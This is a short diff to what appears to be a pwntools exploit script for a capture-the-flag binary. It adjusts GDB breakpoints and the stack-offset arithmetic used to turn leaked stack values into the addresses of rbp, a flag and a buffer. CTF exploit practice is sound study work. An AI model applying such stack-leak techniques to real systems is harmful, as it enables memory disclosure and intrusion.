@@ -47,7 +47,7 @@ def start(argv=[], *a, **kw):
 # ./exploit.py GDB
 gdbscript = """
 tbreak main
-b *vuln+210
+b *vuln
 b read_flag
 continue
 """.format(
@@ -96,7 +96,6 @@ def exploit() -> bool:
     # leaking all the stack vars
     # for i in range(1, 50):
     #    leak = get_stack_var(io, i)
-    #    print(leak)
     #    io.info(f"Leaked the {i}th stack var: {leak.decode('ascii').strip()}.")
 
     # stack indices
@@ -106,7 +105,7 @@ def exploit() -> bool:
     addrs = {"rbp": 0, "flag": 0, "buffer": 0}
 
     # calculate addresses
-    addrs["rbp"] = int(get_stack_var(io, indices["rbp"]), 16) - 0xB0
+    addrs["rbp"] = int(get_stack_var(io, indices["rbp"]), 16) - 0xB0 + 0x50
     addrs["flag"] = addrs["rbp"] - 0x78
     addrs["buffer"] = addrs["rbp"] - 0x70
     io.success(f"Leaked rbp of main: {hex(addrs['rbp'])}")
